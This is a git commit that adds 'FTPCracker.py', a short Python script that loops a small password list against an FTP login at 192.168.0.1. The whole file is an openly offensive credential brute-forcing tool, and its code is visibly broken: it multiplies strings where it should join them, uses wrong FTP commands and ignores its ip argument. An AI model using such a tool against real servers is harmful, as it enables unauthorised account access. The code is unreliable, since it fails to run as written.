c112f1ea500061661c4c9a2675c74dc43852754a
RDxR10 <risirajdey@gmail.com>
2020-04-27 00:17:15 +0530

    Create FTPCracker.py

---
+++ FTPCracker.py
@@ -0,0 +1,20 @@
+import socket
+
+def connection(ip,user,passw):
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    print('Trying' + ip + ':' + user + ':' + passw)
+    sock.connect(('192.168.0.1',21))
+    data = sock.recv(1024)
+    sock.send('User' + user* '\r\n')
+    data = sock.recv(1024)
+    sock.send('Password' + passw *'\r\n')
+    data = sock.recv(1024)
+    sock.send('Quit' * '\r \n')
+    sock.close()
+    return data
+
+use = 'User1'
+password = ['p4ssw0rd', 'shivang430#7','prerana_its_me143']
+
+for password in password:
+    print(connection('192.168.0.1',use,password))
